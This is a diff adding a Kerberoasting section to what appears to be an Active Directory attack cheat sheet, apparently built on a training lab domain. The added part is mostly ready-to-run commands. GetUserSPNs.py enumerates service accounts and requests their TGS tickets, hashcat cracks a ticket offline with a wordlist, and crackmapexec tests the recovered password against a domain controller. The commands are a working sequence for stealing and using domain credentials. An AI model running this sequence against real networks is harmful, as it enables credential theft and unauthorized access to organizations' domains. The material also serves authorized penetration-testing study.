@@ -766,3 +766,37 @@ in `userAccountControl:1.2.840.113556.1.4.803:=8192`
 
 # Active Directory Attacks
 ## Kerberoasting 
+Depending on your position in a network, this attack can be performed in multiple ways:
+- From a non-domain joined Linux host using valid domain user credentials.
+- From a domain-joined Linux host as root after retrieving the keytab file.
+- From a domain-joined Windows host authenticated as a domain user.
+- From a domain-joined Windows host with a shell in the context of a domain account.
+- As SYSTEM on a domain-joined Windows host.
+- From a non-domain joined Windows host using runas /netonly.
+
+### From Linux 
+
+**GetUserSPNs.py**
+```shell
+# Listing SPN Accounts with GetUserSPNs.py
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+
+# Requesting all TGS Tickets
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+
+# Requesting a Single TGS ticket
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+
+# Saving the TGS Ticket to an Output File
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+```
+
+**Cracking the Ticket Offline with Hashcat**
+```shell
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+```
+
+**Testing Authentication against a Domain Controller**
+```shell
+sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+```
